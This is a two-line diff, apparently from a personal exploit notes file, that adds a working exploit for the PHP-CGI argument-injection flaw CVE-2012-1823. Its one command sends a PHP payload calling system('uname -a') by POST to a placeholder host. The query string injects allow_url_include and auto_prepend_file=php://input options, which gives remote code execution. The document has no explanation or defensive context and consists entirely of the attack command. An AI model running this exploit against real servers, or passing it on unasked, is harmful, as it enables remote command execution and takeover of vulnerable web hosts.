@@ -1,0 +1,2 @@
+php cgi exploit - cve-2012-1823
+echo "<?php system('uname -a');die(); ?>" | POST "http://vulnerable/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
